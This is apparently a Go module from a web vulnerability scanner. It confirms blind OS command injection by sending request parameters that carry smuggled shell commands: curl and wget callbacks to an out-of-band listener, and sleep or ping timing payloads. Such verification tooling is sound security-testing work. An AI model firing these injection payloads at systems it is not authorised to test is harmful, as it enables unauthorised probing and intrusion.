package verify

import (
	"net/http"
	"strings"
	"time"
)

// cmdiSleep is the shell pause the time-based payloads request. It is a var so
// tests can shrink it; real runs use the default.
var cmdiSleep = 5 * time.Second

// cmdiOOBPayloads smuggle a shell command that calls our out-of-band listener,
// across the usual command separators. {{OOB}} is replaced with the callback URL.
// A hit proves the injected command ran (blind OS command injection).
func cmdiOOBPayloads() []string {
	return []string{
		"; curl {{OOB}}",
		"| curl {{OOB}}",
		"$(curl {{OOB}})",
		"`curl {{OOB}}`",
		"& curl {{OOB}}",      // Windows / generic
		"; wget -qO- {{OOB}}", // curl-less hosts
	}
}

// cmdiSleepPayloads make a vulnerable shell pause ~cmdiSleep. The oracle is the
// timing delta, so it works fully blind when there is no OOB egress.
func cmdiSleepPayloads() []string {
	return []string{
		"; sleep 5",
		"| sleep 5",
		"$(sleep 5)",
		"`sleep 5`",
		"& ping -n 6 127.0.0.1", // Windows: ~5s with no `sleep`
	}
}

// CmdiProbe verifies OS command injection. Plan/Execute mirror SSRF+SQLi:
// prefer the out-of-band oracle (smuggle a curl to our listener — catches blind
// injection with no reflected output); fall back to a time-based oracle
// (sleep payload + latency delta, re-confirmed to reject a one-off slow response).
type CmdiProbe struct{}

func (CmdiProbe) Kind() string { return "command-injection" }

func (CmdiProbe) Plan(f Finding, oob string) Plan {
	val := "; sleep 5"
	if oob != "" {
		val = "; curl " + oob + "/cmdi-<nonce>"
	}
	u, _ := buildURL(f, f.Param, val)
	return Plan{Summary: methodOf(f) + " " + u +
		"   [" + f.Param + " = OOB curl callback, else time-based sleep]"}
}

func (p CmdiProbe) Execute(f Finding, env *Env) Result {
	r := Result{}

	// (1) Out-of-band: smuggle a curl to our listener with a unique nonce.
	if oob := env.OOB.URL(); oob != "" {
		nonce := "/cmdi-" + newNonce()
		for _, tmpl := range cmdiOOBPayloads() {
			value := strings.ReplaceAll(tmpl, "{{OOB}}", oob+nonce)
			if p.fire(f, env, value) && env.OOB.anyHitPrefix(nonce) {
				r.Confirmed = true
				r.Evidence = "out-of-band: injected shell command called our listener via " + tmpl + " — blind command injection"
				return r
			}
		}
	}

	// (2) Time-based: baseline latency vs sleep-injected latency.
	base, ok := p.timeOnce(f, env, "1")
	if !ok {
		r.Evidence = "baseline request failed (inconclusive)"
		return r
	}
	if b2, ok2 := p.timeOnce(f, env, "1"); ok2 && b2 < base {
		base = b2
	}
	threshold := time.Duration(float64(cmdiSleep) * 0.6)
	for _, payload := range cmdiSleepPayloads() {
		d, ok := p.timeOnce(f, env, payload)
		if !ok || d-base < threshold {
			continue
		}
		if d2, ok2 := p.timeOnce(f, env, payload); ok2 && d2-base >= threshold {
			r.Confirmed = true
			r.Evidence = "time-based: baseline≈" + base.Round(time.Millisecond).String() +
				", injected≈" + d.Round(time.Millisecond).String() +
				" (Δ ≥ " + threshold.Round(time.Millisecond).String() + ") via: " + payload
			return r
		}
	}
	r.Refuted = true
	r.Evidence = "no OOB callback and no payload delayed the response ≥ threshold over baseline ≈" +
		base.Round(time.Millisecond).String()
	return r
}

// fire sends one request with param=value; reports whether it completed.
func (CmdiProbe) fire(f Finding, env *Env, value string) bool {
	u, err := buildURL(f, f.Param, value)
	if err != nil {
		return false
	}
	req, err := http.NewRequest(methodOf(f), u, nil)
	if err != nil {
		return false
	}
	applyHeaders(req, f)
	_, _, err = env.do(req)
	return err == nil
}

// timeOnce sends one request with param=value and returns elapsed wall time.
func (CmdiProbe) timeOnce(f Finding, env *Env, value string) (time.Duration, bool) {
	u, err := buildURL(f, f.Param, value)
	if err != nil {
		return 0, false
	}
	req, err := http.NewRequest(methodOf(f), u, nil)
	if err != nil {
		return 0, false
	}
	applyHeaders(req, f)
	start := time.Now()
	if _, _, err := env.do(req); err != nil {
		return 0, false
	}
	return time.Since(start), true
}

func init() { Register(CmdiProbe{}) }
